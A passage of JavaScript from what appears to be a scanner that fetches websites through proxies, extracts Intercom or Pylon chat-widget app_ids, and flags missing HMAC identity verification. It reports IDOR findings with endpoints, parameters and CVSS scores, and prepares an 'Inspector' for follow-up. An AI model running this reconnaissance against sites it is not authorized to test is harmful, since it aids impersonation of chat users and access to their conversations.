      } else {
        console.log(`[Debug] No alphanumeric run found in 60-char window after '${keyword}'`);
      }
    }

    // ── LAYER 4: TIER 1 boot patterns (belt-and-suspenders) ──────────
    for (const pat of INTERCOM_BOOT_PATTERNS) {
      const bm = text.match(pat);
      if (!bm || !bm[1]) continue;
      if (GENERIC_ID_BLACKLIST.has(bm[1].toLowerCase())) continue;
      if (isValidAppId(bm[1])) {
        return { appId: bm[1], confidence: 'high', patternName: 'boot/intercomSettings' };
      }
    }

    // ── LAYER 5: TIER 2 inline key:value ─────────────────────────────
    for (const pat of INTERCOM_INLINE) {
      const im = text.match(pat);
      if (!im || !im[1]) continue;
      if (GENERIC_ID_BLACKLIST.has(im[1].toLowerCase())) continue;
      if (isValidAppId(im[1])) {
        return { appId: im[1], confidence: 'medium', patternName: 'key-value' };
      }
    }

    // ── LAYER 6: Pylon UUID ───────────────────────────────────────────
    for (const pat of PYLON_INLINE) {
      const pm = text.match(pat);
      if (pm && pm[1]) {
        return { appId: pm[1], confidence: 'high', patternName: 'pylon-uuid' };
      }
    }

    console.log('extractAppId — no match found in', text.length, 'chars');
    return null;
  }

  // Confidence badge for Scan Log display
  const CONF_BADGE = {
    high:   '🟢 HIGH',
    medium: '🟡 MED ',
    low:    '🔴 LOW ',
  };

  // ── Vendor fingerprint — broad net ───────────────────
  function detectVendor(text) {
    const t = text.toLowerCase();
    const isIntercom =
      t.includes('widget.intercom.io') ||
      t.includes('intercomsettings') ||
      t.includes('intercom(') ||
      t.includes('intercom("boot') ||
      t.includes("intercom('boot") ||
      t.includes('api-iam.intercom.io') ||
      // DOM/CSS fingerprints present in rendered HTML
      t.includes('intercom-container') ||
      t.includes('intercom-with-namespace') ||
      t.includes('intercom-messenger') ||
      t.includes('intercom-btn') ||
      t.includes('intercom-frame') ||
      t.includes('intercom-launcher') ||
      // Script src or link href contains intercom
      t.includes('/intercom') ||
      t.includes('intercom.io') ||
      // provider:'intercom' pattern
      (t.includes("'intercom'") || t.includes('"intercom"'));
    const isPylon =
      t.includes('usepylon.com') ||
      t.includes('apichatwidget.usepylon.com') ||
      t.includes('pylon(') ||
      t.includes('pylonsettings') ||
      t.includes('pylon-') ||
      t.includes('"pylon"') ||
      t.includes("'pylon'");
    return { isIntercom, isPylon };
  }

  // ── Asset Discovery ───────────────────────────────────
  // Collects every JS URL from the HTML using four strategies:
  //   1. <script src="...">
  //   2. <link rel="modulepreload" href="...">  (Vite/Nuxt 3)
  //   3. <link rel="preload" as="script" href="...">  (Nuxt 2, Next.js)
  //   4. Raw URL regex: /_nuxt\/[^\s"']+\.js/, intercomcdn.com, usepylon.com
  //      — catches URLs injected dynamically or inside JSON blobs
  function parseScripts(html, baseUrl) {
    const seen = new Set();
    const externalSrcs = [];
    const inlineBlocks = [];

    function addUrl(raw) {
      if (!raw) return;
      try {
        const abs = new URL(raw, baseUrl).href;
        if (!seen.has(abs)) { seen.add(abs); externalSrcs.push(abs); }
      } catch {}
    }

    // 1. <script src>
    const scriptSrcRe = /<script[^>]+src\s*=\s*['"]([^'"]+)['"]/gi;
    let m;
    while ((m = scriptSrcRe.exec(html)) !== null) addUrl(m[1]);

    // 2. <link rel="modulepreload" href="...">  — Vite / Nuxt 3
    const modulePreloadRe = /<link[^>]+rel\s*=\s*["']modulepreload["'][^>]+href\s*=\s*["']([^"']+\.js[^"']*)["']/gi;
    while ((m = modulePreloadRe.exec(html)) !== null) addUrl(m[1]);
    // also href-before-rel order
    const modulePreloadRe2 = /<link[^>]+href\s*=\s*["']([^"']+\.js[^"']*)["'][^>]+rel\s*=\s*["']modulepreload["']/gi;
    while ((m = modulePreloadRe2.exec(html)) !== null) addUrl(m[1]);

    // 3. <link rel="preload" as="script" href="...">  — Nuxt 2 / Next.js
    const preloadRe = /<link[^>]+rel\s*=\s*["']preload["'][^>]+as\s*=\s*["']script["'][^>]+href\s*=\s*["']([^"']+)['"]/gi;
    while ((m = preloadRe.exec(html)) !== null) addUrl(m[1]);
    const preloadRe2 = /<link[^>]+href\s*=\s*["']([^"']+)['"'][^>]+rel\s*=\s*["']preload["'][^>]+as\s*=\s*["']script["']/gi;
    while ((m = preloadRe2.exec(html)) !== null) addUrl(m[1]);

    // 4. Deep raw-text URL scan — catches dynamic injection and JSON blobs.
    //    Patterns: /_nuxt/*.js, intercomcdn.com URLs, usepylon.com URLs
    const rawUrlPatterns = [
      /["'`(](\/_nuxt\/[^\s"'`)\]]+\.js)/g,
      /["'`(](https?:\/\/[^"'`)\]]*(?:intercomcdn\.com|widget\.intercom\.io)[^"'`)\]]*\.js[^"'`)\]]*)/gi,
      /["'`(](https?:\/\/[^"'`)\]]*usepylon\.com[^"'`)\]]*\.js[^"'`)\]]*)/gi,
    ];
    for (const re of rawUrlPatterns) {
      while ((m = re.exec(html)) !== null) addUrl(m[1]);
    }

    // Inline <script> blocks (content only, no src)
    const inlineRe = /<script(?![^>]*src)[^>]*>([\s\S]*?)<\/script>/gi;
    while ((m = inlineRe.exec(html)) !== null) {
      if (m[1].trim()) inlineBlocks.push(m[1]);
    }

    return { externalSrcs, inlineBlocks };
  }

  // ── Script queue scoring + filtering ─────────────────
  //
  // DE-BLOAT RULES (applied before fetching):
  //   1. Filename must contain 'intercom', 'pylon', 'vendor', 'main',
  //      'default', 'app', 'init', 'boot', 'analytics', or 'config'.
  //      Pure numbered chunks (e.g. 1234-abc.js) are skipped unless
  //      they're from an explicit vendor CDN.
  //   2. Files estimated > 250KB are skipped initially.
  //      The app_id is almost never in framework/large-vendor bundles,
  //      and fetching them triggers WAF rate-limiting.
  //
  // SIZE ESTIMATION: The Gatsby manifest JSON in the HTML often contains
  // chunk metadata. We build a sizeHint map during manifest parsing and
  // log it before each fetch attempt.

  const SIZE_CAP_KB = 250;  // skip files larger than this initially

  function scoreScriptUrl(src) {
    const s = src.toLowerCase();
    const name = src.split('/').pop().split('?')[0].toLowerCase();

    // Vendor CDN — always fetch first (score 100)
    if (s.includes('widget.intercom.io') || s.includes('intercomcdn.com')) return 100;
    if (s.includes('usepylon.com') || s.includes('widgetapp/')) return 100;

    // Nuxt 3 / Vite chunks in /_nuxt/ — always relevant, score 95
    // These are the primary bundle location for Nuxt apps
    if (s.includes('/_nuxt/')) return 95;

    // Keyword gate: skip pure-hash chunks with no recognisable token
    const KEYWORDS = ['intercom', 'pylon', 'vendor', 'main', 'default', 'app',
                      'init', 'boot', 'config', 'index', 'entry', 'chunk',
                      'component', 'widget', 'provider', 'integration', 'chat',
                      'runtime', 'layout', 'page'];
    const hasKeyword = KEYWORDS.some(k => name.includes(k));
    if (!hasKeyword) return 0;

    // Score by filename pattern
    if (name.match(/^default-[a-f0-9]+\.js/))            return 90; // Gatsby shared chunk
    if (name.match(/^(app|_app|pages-app)-[a-f0-9]+\.js/)) return 85;
    if (name.match(/^component---/))                      return 78;
    if (name.match(/^(entry|main)\.[a-f0-9]+\.js/))      return 82; // Vite entry
    if (name.includes('vendor'))                          return 70;
    if (name.includes('main') || name.includes('init') || name.includes('boot')) return 65;
    if (name.includes('runtime'))                         return 63;
    if (name.includes('config') || name.includes('index')) return 55;
    if (name.includes('chunk'))                           return 40;
    if (name.match(/\.js(\?|$)/))                        return 30;
    return 0;
  }

  // Returns true if file should be skipped due to size cap
  function oversized(src, sizeHints) {
    const kb = sizeHints[src];
    if (kb !== undefined && kb > SIZE_CAP_KB) return true;
    return false;
  }

  // ── Vendor detection from script src attributes ────────
  // Even before fetching a file, its URL may reveal the vendor.
  function vendorFromScriptSrc(srcs) {
    for (const src of srcs) {
      const s = src.toLowerCase();
      if (s.includes('widget.intercom.io') || s.includes('intercom')) return 'Intercom';
      if (s.includes('usepylon.com') || s.includes('pylon')) return 'Pylon';
    }
    return null;
  }

  // ── Security Status ───────────────────────────────────────────────────
  // Checks a text block for any HMAC / Identity Verification signal.
  // Returns { secure: bool, evidence: string[] }
  function detectSecurity(text) {
    if (!text) return { secure: false, evidence: [] };
    const evidence = [];
    for (const pat of HMAC_PATTERNS) {
      const m = text.match(pat);
      if (m) evidence.push(m[0].slice(0, 60));
    }
    return { secure: evidence.length > 0, evidence };
  }

  // Human-readable label for the security status badge
  function securityLabel(secure) {
    return secure
      ? { text: 'SECURE: HMAC', css: 'badge-secure', icon: '🔒' }
      : { text: 'VULNERABLE: NO-HMAC', css: 'badge-vuln', icon: '⚠' };
  }

  async function deepScan(targetUrl, onStep = () => {}, _preloadedHtml = null) {
    const step = (ok, msg) => { onStep({ ok, msg }); };
    const results = {
      vendor: null, appId: null, appIdSource: null,
      confidence: null,
      hasHmac: false,
      securityStatus: 'UNKNOWN',   // 'SECURE' | 'VULNERABLE' | 'UNKNOWN'
      securityEvidence: [],         // snippets that triggered SECURE classification
      userIdType: 'sequential',
      fetchSuccess: false
    };

    const record = (found, source, label) => {
      results.appId = found.appId;
      results.confidence = found.confidence;
      results.appIdSource = source;
      if (!results.vendor) results.vendor = vendorFromId(found.appId);
      const badge = CONF_BADGE[found.confidence] || '';
      const vendorTag = results.vendor ? ` [${results.vendor}]` : '';
      step(true, `[${badge}] ✓ app_id="${found.appId}"${vendorTag} — ${label} (${found.patternName})`);
    };

    // Accumulate security signals across all fetched text blocks
    const checkSecurity = (text, source) => {
      if (results.hasHmac) return; // already confirmed
      const { secure, evidence } = detectSecurity(text);
      if (secure) {
        results.hasHmac = true;
        results.securityStatus = 'SECURE';
        results.securityEvidence = evidence;
        step(true, `[SECURE] Identity Verification detected in ${source}`);
        evidence.slice(0, 2).forEach(e => step(true, `  ↳ "${e.slice(0, 60)}"`));
      }
    };

    // ── Phase 1: Fetch HTML ──────────────────────────
    let html = '';
    try {
      if (_preloadedHtml) {
        // Demo mode: HTML was fetched locally, skip proxy entirely
        html = _preloadedHtml;
        results.fetchSuccess = true;
        step(true, `HTML loaded locally (${(html.length/1024).toFixed(1)} KB)`);
        checkSecurity(html, 'HTML');
      } else {
        const htmlLog = (ok, msg) => step(ok, `  proxy: ${msg}`);
        const htmlResult = await proxyFetch(targetUrl, 16000, htmlLog);
        // proxyFetch returns { text, raw, decoded } — use .text for HTML
        html = htmlResult.text || htmlResult;
      results.fetchSuccess = true;
      step(true, `HTML fetched (${(html.length/1024).toFixed(1)} KB)`);
      checkSecurity(html, 'HTML');
      } // end else (proxy fetch)
    } catch (e) {
      step(false, `HTML fetch failed: ${e.message}`);
      return results;
    }

    // ── Fix 3: Phase 1 IMMEDIATE WIN — run fuzzyExtract the moment HTML arrives ─
    // Do this before parseScripts, before vendor detection, before everything.
    // If providerKey/appId is anywhere in the HTML, grab it now and skip all JS fetches.
    step(true, `[HTML Native] IMMEDIATE sweep on ${(html.length/1024).toFixed(1)}KB HTML...`);
    const immediateHit = fuzzyExtract(html);
    if (immediateHit) {
      step(true, `[HTML Native] SUCCESS — app_id="${immediateHit.appId}" (${immediateHit.patternName})`);
      record(immediateHit, 'html-native-immediate', '[HTML Native] immediate fuzzy sweep');
      if (!results.vendor) results.vendor = vendorFromId(immediateHit.appId) || 'Intercom';
      // Short-circuit: populate Inspector and skip all JS fetches
      autoPopulateInspector(results);
    }

    // ── Phase 1+: Additional HTML extraction passes (if immediate sweep missed) ──
    step(true, `[HTML Sweep] Running full extraction pipeline on HTML...`);

    // Phase 1+a: extractAppId full pipeline (belt-and-suspenders)
    if (!results.appId) {
      const phase1Hit = extractAppId(html);
      if (phase1Hit) {
        record(phase1Hit, 'html-native', '[HTML Native] full pipeline');
        if (!results.vendor) results.vendor = 'Intercom';
      }
    }

    // Phase 1+b: Widget loader URL
    if (!results.appId) {
      const widgetSrcMatch = html.match(INTERCOM_WIDGET_URL);
      if (widgetSrcMatch && isValidAppId(widgetSrcMatch[1])) {
        record({ appId: widgetSrcMatch[1], confidence: 'high', patternName: 'widget-loader-url' },
          'html-native', '[HTML Native] widget loader URL');
        if (!results.vendor) results.vendor = 'Intercom';
      }
    }

    // Phase 1+c: providerKey structural patterns
    if (!results.appId) {
      const providerKeyPatterns = [
        /provider\s*[=:]\s*["']intercom["'][^}]{0,200}providerKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
        /providerKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
        /vendorKey\s*[=:]\s*["'`]([a-zA-Z0-9]{6,12})["'`]/i,
      ];
      for (const pat of providerKeyPatterns) {
        const m = html.match(pat);
        if (m && m[1] && isValidAppId(m[1])) {
          record({ appId: m[1], confidence: 'high', patternName: 'providerKey/vendorKey' },
            'html-native-providerKey', '[HTML Native] providerKey/vendorKey');
          if (!results.vendor) results.vendor = 'Intercom';
          break;
        } else if (m && m[1] && GENERIC_ID_BLACKLIST.has(m[1].toLowerCase())) {
          step(false, `[HTML Native] providerKey="${m[1]}" → Generic Asset (blacklisted), continuing...`);
        }
      }
    }

    // ── Phase 1+d: General extractAppId against full HTML ─────────────
    if (!results.appId) {
      const htmlFound = extractAppId(html);
      if (htmlFound) {
        record(htmlFound, 'html-native', '[HTML Native] inline script');
        if (!results.vendor) results.vendor = 'Intercom';
      }
    }

    // 1e. Pylon CDN URL
    if (!results.appId) {
      const pm = html.match(/apichatwidget\.usepylon\.com[^\s"']*app_id=([0-9a-f-]{36})/i);
      if (pm) {
        record({ appId: pm[1], confidence: 'high', patternName: 'pylon-cdn-url' },
          'html-native', '[HTML Native] Pylon CDN URL');
        if (!results.vendor) results.vendor = 'Pylon';
      }
    }

    // ── EARLY EXIT: HIGH confidence in HTML → stop, no JS fetching ────
    if (results.appId && results.confidence === 'high') {
      step(true, `[HTML Native] ✓ HIGH confidence ID found in HTML — skipping JS fetch phase entirely`);
      // Auto-populate Inspector immediately so user can start using it
      autoPopulateInspector(results);
    }

    // ── Phase 2: Vendor detection ─────────────────────
    const { isIntercom, isPylon } = detectVendor(html);
    if (isIntercom && !results.vendor) results.vendor = 'Intercom';
    if (isPylon && !results.vendor) results.vendor = 'Pylon';

    const { externalSrcs, inlineBlocks } = parseScripts(html, targetUrl);

    if (!results.vendor) {
      const vendorFromSrc = vendorFromScriptSrc(externalSrcs);
      if (vendorFromSrc) {
        results.vendor = vendorFromSrc;
        step(true, `Vendor "${vendorFromSrc}" from script src URL`);
      }
    }
    step(!!(results.vendor),
      results.vendor ? `Vendor: ${results.vendor}` : `Vendor not detected — scanning scripts`);

    // ── Phase 3: Inline <script> blocks ───────────────
    // Only run if HTML extraction didn't already find a high-confidence ID
    if (!results.appId || results.confidence !== 'high') {
      const allInline = inlineBlocks.join('\n');
      if (allInline.length > 10) {
        step(true, `[HTML Native] Scanning ${inlineBlocks.length} inline <script> blocks...`);
        if (!results.vendor) {
          const iv = detectVendor(allInline);
          if (iv.isIntercom) { results.vendor = 'Intercom'; }
          if (iv.isPylon)    { results.vendor = 'Pylon'; }
        }
        const inlineFound = extractAppId(allInline);
        if (inlineFound && (!results.appId || inlineFound.confidence === 'high')) {
          record(inlineFound, 'html-native-inline', '[HTML Native] inline <script>');
        }
        checkSecurity(allInline, 'inline scripts');
      }
    }

    // ── Phase 4: External JS files ─────────────────────
    // Only run JS fetch phase if HTML gave us nothing or only low/medium confidence.
    const needsJsFetch = !results.appId || results.confidence !== 'high';

    if (needsJsFetch) {
      resetCircuitBreakers();

      // ── Gatsby manifest discovery ──────────────────────────────────────
      const sizeHints = {};
      const manifestRe = /"(?:default|commons|pages-manifest)"\s*:\s*\[([^\]]+)\]/g;
      let cm;
      const manifestAdded = [];
      while ((cm = manifestRe.exec(html)) !== null) {
        const entries = [...cm[1].matchAll(/"(\/[^"]+\.js)"/g)];
        entries.forEach(e => {
          try {
            const u2 = new URL(e[1], targetUrl).href;
            if (!externalSrcs.includes(u2)) {
              externalSrcs.push(u2);
              manifestAdded.push(e[1].split('/').pop());
            }
          } catch {}
        });
      }
      if (manifestAdded.length) step(true, `[JS Fetched] Gatsby manifest: ${manifestAdded.join(', ')}`);

      // ── Nuxt 3 / Vite deep-scan — catch /_nuxt/*.js URLs in JSON blobs ──
      // Nuxt embeds its chunk manifest inside inline <script> as JSON.
      // The modulepreload / preload links are captured by parseScripts() above,
      // but some chunks only appear in the __NUXT__ JSON payload.
      const nuxtRe = /\/_nuxt\/[^\s"'`,)]+\.js/g;
      let nm;
      const nuxtAdded = [];
      while ((nm = nuxtRe.exec(html)) !== null) {
        try {
          const abs = new URL(nm[0], targetUrl).href;
          if (!externalSrcs.includes(abs)) {
            externalSrcs.push(abs);
            nuxtAdded.push(nm[0].split('/').pop());
          }
        } catch {}
      }
      if (nuxtAdded.length) step(true, `[JS Fetched] Nuxt chunks found: ${nuxtAdded.length} file(s)`);

      // Queue: score > 0 means scoreScriptUrl already approved the file.
      // scoreScriptUrl has the full keyword gate + scoring — no second filter needed.
      // Size cap: skip files we KNOW are large (>300KB) — default-HASH.js is ~47KB
      // and always scores 90, so it always makes it through. Hard cap at 8 files.
      const queue = externalSrcs
        .map(src => ({ src, score: scoreScriptUrl(src) }))
        .filter(({ src, score }) => {
          if (score === 0) return false;
          return true;
        })
        .sort((a, b) => b.score - a.score)
        .slice(0, 8);

      step(true, `[JS Fetched] Queue: ${queue.length} file(s) after keyword+size filter`);

      for (const { src, score } of queue) {
        // Stop if we have a high-confidence ID
        if (results.appId && results.confidence === 'high') break;

        const shortName = src.split('/').pop().split('?')[0].slice(0, 50);
        const hintStr = sizeHints[src] ? ` ~${sizeHints[src]}KB` : '';
        step(true, `[JS Fetched] → [score:${score}${hintStr}] ${shortName}`);

        const attemptLog = (ok, msg) => step(ok, `  ${msg}`);
        let js = null, _jsRaw = null, _jsDecoded = null;

        try {
          const jsResult = await proxyFetch(src, 12000, attemptLog);
          if (jsResult && typeof jsResult === 'object' && jsResult.text !== undefined) {
            // New object return — extract all three variants
            js       = jsResult.text;
            _jsRaw   = (jsResult.raw !== jsResult.text) ? jsResult.raw : null;
            _jsDecoded = jsResult.decoded || null;
          } else if (jsResult) {
            js = String(jsResult); // legacy plain-string fallback
          }
        } catch (fetchErr) {
          step(false, `  all proxies failed: ${fetchErr.message} — trying DOM side-load`);
          const sideResult = await sideLoadExtract(src, attemptLog, 5000);
          if (sideResult?.appId && !isBlacklisted(sideResult.appId)) {
            record({ appId: sideResult.appId, confidence: 'medium', patternName: 'side-load-window' },
              `${shortName} (side-load)`, '[JS Fetched] DOM side-load');
            if (!results.vendor) results.vendor = 'Intercom';
          } else {
            step(false, `✗ ${shortName}: fetch + side-load both failed`);
          }
          continue;
        }

        if (!js) continue;

        if (!results.vendor) {
          const jv = detectVendor(js);
          if (jv.isIntercom) { results.vendor = 'Intercom'; step(true, `Vendor: Intercom in ${shortName}`); }
          else if (jv.isPylon) { results.vendor = 'Pylon'; step(true, `Vendor: Pylon in ${shortName}`); }
        }

        // Security check on every fetched JS block
        checkSecurity(js, shortName);

        // Search all text variants — primary, raw-original, decoded
        // This catches cases where decodeURIComponent garbled the primary text
        const jsVariants = [js];
        if (_jsRaw)     jsVariants.push(_jsRaw);
        if (_jsDecoded) jsVariants.push(_jsDecoded);

        let jFound = null;
        outer: for (const jsText of jsVariants) {
          const jsProviderPatterns = [
            /provider\s*[=:]\s*["']intercom["'][^}]{0,200}providerKey\s*[=:]\s*["'`\\]{0,2}([a-zA-Z0-9]{6,12})["'`\\]{0,2}/i,
            /providerKey\s*[=:]\s*["'`\\]{0,2}([a-zA-Z0-9]{6,12})["'`\\]{0,2}/i,
            /vendorKey\s*[=:]\s*["'`\\]{0,2}([a-zA-Z0-9]{6,12})["'`\\]{0,2}/i,
          ];
          for (const pat of jsProviderPatterns) {
            const pm = jsText.match(pat);
            if (pm && pm[1]) {
              if (GENERIC_ID_BLACKLIST.has(pm[1].toLowerCase())) {
                step(false, `  [JS Fetched] providerKey="${pm[1]}" → Generic Asset (blacklisted), continuing...`);
              } else if (isValidAppId(pm[1])) {
                jFound = { appId: pm[1], confidence: 'high', patternName: 'providerKey/vendorKey' };
                break outer;
              }
            }
          }
          // fuzzyExtract covers all other patterns on each variant
          if (!jFound) jFound = fuzzyExtract(jsText);
          if (jFound) break;
        }
        // Final fallback to full extractAppId on primary text
        if (!jFound) jFound = extractAppId(js);
        if (jFound) {
          // Only upgrade if found confidence is better than current
          const betterConfidence = !results.appId ||
            (results.confidence === 'medium' && jFound.confidence === 'high') ||
            results.confidence === 'low';
          if (betterConfidence) {
            record(jFound, `${shortName} [score:${score}]`, '[JS Fetched] external script');
          }
        } else {
          step(false, `[JS Fetched] No app_id in ${shortName} (${(js.length/1024).toFixed(0)}KB)`);
          // Fix 4: If the keyword exists in the file but regex still failed,
          // log the exact 50-char context so we can see the encoding.
          const kwCheck = js.match(/(?:providerKey|vendorKey|appId|app_id)/i);
          if (kwCheck) {
            const kwIdx = kwCheck.index;
            const ctx = js.slice(kwIdx, kwIdx + 50);
            step(false, `  [Debug] Keyword '${kwCheck[0]}' found but extraction failed. Context: ${JSON.stringify(ctx)}`);
            console.log(`[Debug] FULL CONTEXT after '${kwCheck[0]}': ${JSON.stringify(js.slice(kwIdx, kwIdx + 80))}`);
            const charCodes = js.slice(kwIdx + kwCheck[0].length, kwIdx + kwCheck[0].length + 10)
              .split('').map(c => `${c}[${c.charCodeAt(0)}]`).join(' ');
            console.log(`[Debug] Char codes after keyword: ${charCodes}`);
          }
        }

        if (!results.hasHmac) {
          results.hasHmac = HMAC_PATTERNS.some(p => p.test(js));
          if (results.hasHmac) step(true, `HMAC detected in ${shortName}`);
        }
      }
    } // end needsJsFetch

    // ── Phase 5: CSS namespace — LAST RESORT ──────────
    // Only runs if NOTHING was found in HTML or JS.
    // Confidence: LOW. Always warns user to verify.
    if (!results.appId) {
      step(false, `[CSS Last Resort] All JS extraction failed — scanning CSS namespaces...`);
      const activeNs = html.match(
        /intercom-(?:with-)?namespace-([a-zA-Z0-9]{4,16})[^}]{0,150}(?:display\s*:\s*block|animation\s*:)/
      );
      if (activeNs && !isBlacklisted(activeNs[1])) {
        record({ appId: activeNs[1], confidence: 'low', patternName: 'css-namespace-active' },
          'css-namespace ⚠ verify', '[CSS Last Resort] active namespace (display:block)');
        if (!results.vendor) results.vendor = 'Intercom';
      } else {
        // Collect all namespaces, exclude display:none ones
        const hiddenNs = new Set();
        const hiddenRe2 = /intercom-(?:with-)?namespace-([a-zA-Z0-9]{4,16})[^}]{0,80}display\s*:\s*none/g;
        let hm2;
        while ((hm2 = hiddenRe2.exec(html)) !== null) hiddenNs.add(hm2[1]);
        const allNs = [];
        const allRe2 = /intercom-(?:with-)?namespace-([a-zA-Z0-9]{4,16})/g;
        let am2;
        while ((am2 = allRe2.exec(html)) !== null) {
          if (!allNs.includes(am2[1])) allNs.push(am2[1]);
        }
        const chosen = allNs.find(ns => !hiddenNs.has(ns) && !isBlacklisted(ns));
        if (chosen) {
          record({ appId: chosen, confidence: 'low', patternName: 'css-namespace-fallback' },
            'css-namespace ⚠ verify', '[CSS Last Resort] namespace fallback');
          if (!results.vendor) results.vendor = 'Intercom';
        }
      }
    }

    if (!results.hasHmac) results.hasHmac = HMAC_PATTERNS.some(p => p.test(html));
    // Finalize securityStatus — if no evidence found anywhere, mark VULNERABLE
    if (!results.hasHmac) results.securityStatus = 'VULNERABLE';
    step(results.hasHmac,
      results.hasHmac
        ? `[SECURE] Identity Verification detected — HMAC enforced`
        : `[VULNERABLE] No HMAC / Identity Verification signals found`);

    const uuidPat = /user_id\s*:\s*["'][0-9a-f]{8}-[0-9a-f]{4}/i;
    if (uuidPat.test(html)) results.userIdType = 'uuid';

    if (!results.appId) step(false, 'app_id not found — enter manually in Inspector');
    else step(true, `Final: app_id="${results.appId}" confidence=${results.confidence} source=${results.appIdSource}`);

    return results;
  }

  function buildFindings(vendor, appId, hasHmac, settings) {
    // No vendor detected AND no app_id extracted — site doesn't use a known widget.
    // Return a special sentinel instead of falsely reporting Intercom findings.
    if (!vendor && !appId) {
      return [{ _noWidget: true }];
    }

    const findings = [];
    if (vendor === 'Intercom' || !vendor) {
      if (settings.a01 && !hasHmac) {
        findings.push({
          id: 'A01', cvss: '7.5',
          title: 'Intercom — Missing HMAC on user_id (IDOR)',
          param: 'user_data → user_id',
          endpoint: 'POST /messenger/web/conversations',
          appId
        });
      }
      if (settings.a02 && !hasHmac) {
        findings.push({
          id: 'A02', cvss: '7.5',
          title: 'Intercom — Missing HMAC on email (IDOR)',
          param: 'user_data → email',
          endpoint: 'POST /messenger/web/conversations',
          appId
        });
      }
    }
    if (vendor === 'Pylon' || vendor === 'UsePylon') {
      if (settings.a03) {
        findings.push({
          id: 'A03', cvss: '8.1',
          title: 'Pylon — Unauthorized issue_id Lookup (Two-Step IDOR)',
          param: 'email → issue_id',
          endpoint: 'GET /chatwidget/unreads + GET /chatwidget/issue',
          appId: appId || TemplateManager.PYLON_APP_ID
        });
      }
    }
    return findings;
  }

  function renderFindings(findings, appId, hasHmac, fetchSuccess, appIdSource, confidence, securityStatus) {
    const container = document.getElementById('findingsContainer');
    const isNoWidget = findings.length === 1 && findings[0]._noWidget;

    const sl = securityLabel(hasHmac);
    // Don't show the HMAC badge at all when no widget was detected — it's misleading
    const secBadge = isNoWidget ? '' : `<span class="sec-badge ${sl.css}">${sl.icon} ${sl.text}</span>`;

    const confBadgeHtml = confidence
      ? { high:   `<span class="conf-badge conf-high">🟢 HIGH CONFIDENCE</span>`,
          medium: `<span class="conf-badge conf-med">🟡 MED CONFIDENCE</span>`,
          low:    `<span class="conf-badge conf-low">🔴 LOW — VERIFY</span>` }[confidence] || ''
      : '';

    const sourceTag = appIdSource
      ? `<span class="meta-code-src">[${escapeHtml(appIdSource)}]</span>`
      : '';

    // Build the top banner differently for no-widget vs normal cases
    const fetchBanner = isNoWidget
      // No widget: neutral grey banner regardless of whether fetch succeeded
      ? `<div style="background:var(--bg-tertiary);border:1px solid var(--border);border-radius:var(--radius);padding:.5rem .875rem;margin-bottom:.75rem;font-size:.75rem;color:var(--text-muted);display:flex;gap:.5rem;align-items:center">
           <span>🔍</span>
           <span>Page ${fetchSuccess ? 'fetched' : 'fetch attempted'} — no chat widget signals found.</span>
         </div>`
      : fetchSuccess
      ? `<div class="meta-summary">
           <div class="meta-summary-main">
             <span class="meta-summary-check">&#10003;</span>
             <div class="meta-summary-text">
               ${appId
                 ? `<div class="meta-summary-status">Page source fetched. <span class="ms-sub">Extracted &amp; auto-populated in Inspector.</span></div>
                    <div class="meta-summary-token"><code class="meta-code-pill">${escapeHtml(appId)}</code>${sourceTag}</div>
                    ${confBadgeHtml}`
                 : `<div class="meta-summary-status">Page source fetched. <span style="color:var(--warn-amber)">app_id not found — enter manually in Inspector.</span></div>`}
             </div>
           </div>
           ${secBadge}
         </div>`
      : `<div style="background:var(--warn-amber-bg);border:1px solid rgba(245,158,11,.3);border-radius:var(--radius);padding:.5rem .875rem;margin-bottom:.75rem;font-size:.75rem;color:var(--warn-amber);display:flex;gap:.5rem;align-items:center">
           <span>&#9888;</span>
           <span style="flex:1">Could not fetch page source. Enter <code style="background:var(--bg-tertiary);padding:.1rem .3rem;border-radius:3px">app_id</code> manually in Inspector.</span>
           ${secBadge}
         </div>`;

    if (!findings.length) {
      container.innerHTML = fetchBanner + `<div class="finding-card"><div class="finding-header"><span class="finding-title" style="color:var(--secure-green)">&#10003; No misconfigurations detected</span><span class="cvss-badge cvss-safe">SECURE</span></div></div>`;
      return;
    }

    // No-widget sentinel — site doesn't appear to use Intercom or Pylon
    if (isNoWidget) {
      container.innerHTML = fetchBanner + `
        <div class="finding-card" style="border-color:var(--border)">
          <div class="finding-header" style="cursor:default">
            <span style="font-size:1.1rem">🔍</span>
            <span class="finding-title" style="color:var(--text-secondary)">No chat widget detected</span>
            <span class="cvss-badge" style="background:rgba(100,116,139,.1);color:#94a3b8;border:1px solid rgba(100,116,139,.3)">N/A</span>
          </div>
          <div class="finding-body open" style="color:var(--text-muted);font-size:.8125rem;line-height:1.7">
            No Intercom or Pylon chat widget was identified on this target.<br>
            The page source was fetched but contained no <code style="background:var(--bg-tertiary);padding:.1rem .3rem;border-radius:3px;color:var(--accent)">providerKey</code>,
            <code style="background:var(--bg-tertiary);padding:.1rem .3rem;border-radius:3px;color:var(--accent)">app_id</code>,
            or vendor CDN references.<br><br>
            <strong style="color:var(--text-secondary)">This target is not in scope for these checks.</strong>
            If you believe a widget is present, try scanning a specific sub-page where the chat widget loads,
            or use the Inspector manually with a known app_id.
          </div>
        </div>`;
      return;
    }

    container.innerHTML = fetchBanner + findings.map((f, i) => `
      <div class="finding-card">
        <div class="finding-header" onclick="toggleFinding(${i})">
          <span style="color:var(--vulnerable-red);font-family:var(--font-mono);font-size:.75rem;font-weight:700">[${f.id}]</span>
          <span class="finding-title">${f.title}</span>
          <span class="cvss-badge cvss-high">CVSS ${f.cvss} HIGH</span>
          <span style="color:var(--text-muted);font-size:.75rem">&#9660;</span>
        </div>
        <div class="finding-body" id="fb-${i}">
          <div class="finding-row"><span class="finding-label">Endpoint</span><span class="finding-value" style="font-family:var(--font-mono);font-size:.75rem">${f.endpoint}</span></div>
          <div class="finding-row"><span class="finding-label">Parameter</span><span class="finding-value vuln">${f.param}</span></div>
          <div class="finding-row"><span class="finding-label">HMAC status</span><span class="finding-value ${hasHmac ? 'safe' : 'vuln'}">${hasHmac ? '&#10003; Present (but may not be enforced server-side)' : '&#9679; Missing — Identity Verification not enforced'}</span></div>
          <div class="finding-row">
            <span class="finding-label">app_id</span>
            <span class="finding-value" style="font-family:var(--font-mono);font-size:.75rem">
              ${f.appId
                ? `<span style="color:var(--accent)">${escapeHtml(f.appId || '')}</span> <span style="color:var(--secure-green);font-size:.6875rem">&#10003; extracted</span>`
                : `<span style="color:var(--warn-amber)">not found — enter in Inspector</span>`}
            </span>
          </div>
          <div style="margin-top:.75rem;display:flex;gap:.5rem">
